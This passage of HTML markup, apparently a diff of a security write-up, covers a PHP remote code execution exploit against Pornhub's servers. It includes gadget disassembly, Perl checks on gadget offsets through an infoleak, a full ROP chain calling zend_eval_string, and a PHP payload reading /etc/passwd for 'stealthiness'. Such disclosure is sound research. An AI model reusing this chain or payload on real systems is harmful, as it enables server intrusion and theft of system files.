class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">384</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">rcrb</span><span class="crayon-h"> </span><span class="crayon-cn">$0x41</span><span class="crayon-sy">,</span><span class="crayon-cn">0x5d</span><span class="crayon-sy">(</span><span class="crayon-v ">%rbx</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f5650238627-4"><span class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">388</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">pop</span><span class="crayon-h"> </span><span class="crayon-v ">%rsp</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">#</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span></div><div class="crayon-line" id="crayon-59661681500f5650238627-5"><span class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">389</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">pop</span><span class="crayon-h"> </span><span class="crayon-v ">%r</span>13</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f5650238627-6"><span class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">391</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">pop</span><span class="crayon-h"> </span><span class="crayon-v ">%r</span>14</div><div class="crayon-line" id="crayon-59661681500f5650238627-7"><span class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">393</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">retq</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">This was used to nicely modify RSP to point to our by POST data provided ROP chain, effectively chaining all provided gadget calls.</p>
+<p style="text-align: justify;">According to the x86_64 calling convention the first two parameters of a function are RDI and RSI, so we had to find a <em>pop %rdi</em> and <em>pop %rsi </em>gadget, too<em>. </em>Those are pretty common and thus easily found. However, we still had no idea if those gadgets actually existed on Pornhub&#8217;s version of PHP. Therefore, we had to manually verify their presence.</p>
+<h5><span id="Verifying_the_presence_of_the_required_ROP_gadgets">Verifying the presence of the required ROP gadgets</span></h5>
+<p style="text-align: justify;">The infoleak vector allowed us to quickly dump the disassembly of <em>php_stream_bucket_split </em>and check if our stack pivoting gadget was available on the remote version. Fortunately, only little corrections of the gadgets&#8217; offsets were necessary. Finally, we implemented some checks to confirm that all addresses were correct:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500f8296922780" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+my $pivot  = leak($php_base + 0x51a71f, 13);
+my $poprdi = leak($php_base + 0x2b904e, 2);
+my $poprsi = leak($php_base + 0x50ee0c, 2);
+
+die '[!] pivot gadget doesnt seem to be right', $/
+    unless ($pivot eq "\x50\x2c\x31\xc0\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\xc3");
+
+die '[!] poprdi gadget doesnt seem to be right', $/
+    unless ($poprdi eq "\x5f\xc3");
+
+die '[!] poprsi gadget doesnt seem to be right', $/
+    unless ($poprsi eq "\x5e\xc3");</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500f8296922780-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f8296922780-2">2</div><div class="crayon-num" data-line="crayon-59661681500f8296922780-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f8296922780-4">4</div><div class="crayon-num" data-line="crayon-59661681500f8296922780-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f8296922780-6">6</div><div class="crayon-num" data-line="crayon-59661681500f8296922780-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f8296922780-8">8</div><div class="crayon-num" data-line="crayon-59661681500f8296922780-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f8296922780-10">10</div><div class="crayon-num" data-line="crayon-59661681500f8296922780-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f8296922780-12">12</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500f8296922780-1"><span class="crayon-st">my</span><span class="crayon-h"> </span><span class="crayon-v">$pivot</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">leak</span><span class="crayon-sy">(</span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x51a71f<span class="crayon-sy">,</span><span class="crayon-h"> </span>13<span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f8296922780-2"><span class="crayon-st">my</span><span class="crayon-h"> </span><span class="crayon-v">$poprdi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">leak</span><span class="crayon-sy">(</span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x2b904e<span class="crayon-sy">,</span><span class="crayon-h"> </span>2<span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500f8296922780-3"><span class="crayon-st">my</span><span class="crayon-h"> </span><span class="crayon-v">$poprsi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">leak</span><span class="crayon-sy">(</span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x50ee0c<span class="crayon-sy">,</span><span class="crayon-h"> </span>2<span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f8296922780-4">&nbsp;</div><div class="crayon-line" id="crayon-59661681500f8296922780-5"><span class="crayon-r">die</span><span class="crayon-h"> </span><span class="crayon-s">'[!] pivot gadget doesnt seem to be right'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-o">/</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f8296922780-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">unless</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$pivot</span><span class="crayon-h"> </span><span class="crayon-st">eq</span><span class="crayon-h"> </span><span class="crayon-s">"\x50\x2c\x31\xc0\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\xc3"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500f8296922780-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f8296922780-8"><span class="crayon-r">die</span><span class="crayon-h"> </span><span class="crayon-s">'[!] poprdi gadget doesnt seem to be right'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-o">/</span></div><div class="crayon-line" id="crayon-59661681500f8296922780-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">unless</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$poprdi</span><span class="crayon-h"> </span><span class="crayon-st">eq</span><span class="crayon-h"> </span><span class="crayon-s">"\x5f\xc3"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f8296922780-10">&nbsp;</div><div class="crayon-line" id="crayon-59661681500f8296922780-11"><span class="crayon-r">die</span><span class="crayon-h"> </span><span class="crayon-s">'[!] poprsi gadget doesnt seem to be right'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-o">/</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f8296922780-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">unless</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$poprsi</span><span class="crayon-h"> </span><span class="crayon-st">eq</span><span class="crayon-h"> </span><span class="crayon-s">"\x5e\xc3"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>&nbsp;</p>
+<h5><span id="Crafting_the_ROPstack">Crafting the ROP stack</span></h5>
+<p style="text-align: justify;">The final ROP payload that effectively executed <em>zend_eval_string(code); exit(0);</em> looked like the following snippet:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500fa278921421" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+my $rop = "";
+$rop .= pack('Q', $php_base + 0x51a71f);              # pivot rsp
+$rop .= pack('Q', 0xdeadbeef);                        # junk
+$rop .= pack('Q', $php_base + 0x2b904e);              # pop rdi
+$rop .= pack('Q', $post_addr + length($rop) + 8 * 7); # pointing to $php_code
+$rop .= pack('Q', $php_base + 0x50ee0c);              # pop rsi
+$rop .= pack('Q', 0);                                 # retval_ptr
+$rop .= pack('Q', $zend_eval_string);                 # zend_eval_string
+$rop .= pack('Q', $php_base + 0x2b904e);              # pop rdi
+$rop .= pack('Q', 0);                                 # exit code
+$rop .= pack('Q', $exit);                             # exit
+$rop .= $php_code . "\x00";</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500fa278921421-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fa278921421-2">2</div><div class="crayon-num" data-line="crayon-59661681500fa278921421-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fa278921421-4">4</div><div class="crayon-num" data-line="crayon-59661681500fa278921421-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fa278921421-6">6</div><div class="crayon-num" data-line="crayon-59661681500fa278921421-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fa278921421-8">8</div><div class="crayon-num" data-line="crayon-59661681500fa278921421-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fa278921421-10">10</div><div class="crayon-num" data-line="crayon-59661681500fa278921421-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fa278921421-12">12</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500fa278921421-1"><span class="crayon-st">my</span><span class="crayon-h"> </span><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fa278921421-2"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x51a71f<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># pivot rsp</span></div><div class="crayon-line" id="crayon-59661681500fa278921421-3"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>0xdeadbeef<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># junk</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fa278921421-4"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x2b904e<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># pop rdi</span></div><div class="crayon-line" id="crayon-59661681500fa278921421-5"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$post_addr</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-r">length</span><span class="crayon-sy">(</span><span class="crayon-v">$rop</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>8<span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span>7<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c"># pointing to $php_code</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fa278921421-6"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x50ee0c<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># pop rsi</span></div><div class="crayon-line" id="crayon-59661681500fa278921421-7"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>0<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c"># retval_ptr</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fa278921421-8"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$zend_eval_string</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c"># zend_eval_string</span></div><div class="crayon-line" id="crayon-59661681500fa278921421-9"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$php_base</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span>0x2b904e<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># pop rdi</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fa278921421-10"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>0<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c"># exit code</span></div><div class="crayon-line" id="crayon-59661681500fa278921421-11"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">pack</span><span class="crayon-sy">(</span><span class="crayon-s">'Q'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$exit</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c"># exit</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fa278921421-12"><span class="crayon-v">$rop</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$php_code</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"\x00"</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0010 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Because the stack pivot contained a <em>pop %r13</em> and <em>pop %r14</em> the <em>0xdeadbeef </em>padding<em> </em>inside the remaining chain was necessary to continue with setting RDI. As the first parameter to <em>zend_eval_string </em>RDI is required to reference the code that is to be executed. This code is located right after the ROP chain. It was also required to keep sending the exact same amount of data between each request so that all calculated offsets stayed correct. This was achieved by setting up different paddings wherever it was necessary.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">The next step was to finally trigger code execution by returning back into the PHP interpreter. Actually, other techniques like return2libc are quite applicable as well but create a few other problems that are easier dealt with when staying in PHP context.</p>
+<h4 style="text-align: justify;"><span id="Returning_into_PHP">Returning into PHP</span></h4>
+<p style="text-align: justify;">Being able to execute arbitrary PHP code is an important step, but being able to view its output is equally important, unless one wants to deal with side channels to receive responses. So the remaining tricky part was to somehow display the result on Pornhub&#8217;s website.</p>
+<h5><span id="Clean_termination_of_PHP">Clean termination of PHP</span></h5>
+<p style="text-align: justify;">Usually php-cgi forwards the generated content back to the web server so that it&#8217;s displayed on the website, but wrecking the control flow that badly creates an abnormal termination of PHP so that its result will never reach the HTTP server. To get around this problem we simply told PHP to use direct unbuffered responses that are usually used for HTTP streaming:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500fe823639752" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+my $php_code = 'eval(\'
+    header("X-Accel-Buffering: no");
+    header("Content-Encoding: none");
+    header("Connection: close");
+    error_reporting(0);
+    echo file_get_contents("/etc/passwd");
+    ob_end_flush();
+    ob_flush();
+    flush();
+\');';</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500fe823639752-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fe823639752-2">2</div><div class="crayon-num" data-line="crayon-59661681500fe823639752-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fe823639752-4">4</div><div class="crayon-num" data-line="crayon-59661681500fe823639752-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fe823639752-6">6</div><div class="crayon-num" data-line="crayon-59661681500fe823639752-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fe823639752-8">8</div><div class="crayon-num" data-line="crayon-59661681500fe823639752-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500fe823639752-10">10</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500fe823639752-1"><span class="crayon-st">my</span><span class="crayon-h"> </span><span class="crayon-v">$php_code</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'eval(\'</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fe823639752-2"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;header("X-Accel-Buffering: no");</span></div><div class="crayon-line" id="crayon-59661681500fe823639752-3"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;header("Content-Encoding: none");</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fe823639752-4"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;header("Connection: close");</span></div><div class="crayon-line" id="crayon-59661681500fe823639752-5"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;error_reporting(0);</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fe823639752-6"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo file_get_contents("/etc/passwd");</span></div><div class="crayon-line" id="crayon-59661681500fe823639752-7"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;ob_end_flush();</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fe823639752-8"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;ob_flush();</span></div><div class="crayon-line" id="crayon-59661681500fe823639752-9"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;flush();</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500fe823639752-10"><span class="crayon-s">\');'</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0001 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">This finally allowed us to directly fetch every output the PHP payload generated without having to worry about the cleanup routines that are usually involved when the CGI process sends data to the web server. This further increased the stealthiness factor by minimizing the number of potential errors and crashes.</p>
+<p style="text-align: justify;">To summarize, our payload contained a fake object with its <em>add_ref</em> function pointer pointing to our first ROP gadget. The following diagram visualizes this concept:</p>
+<p>&nbsp;</p>
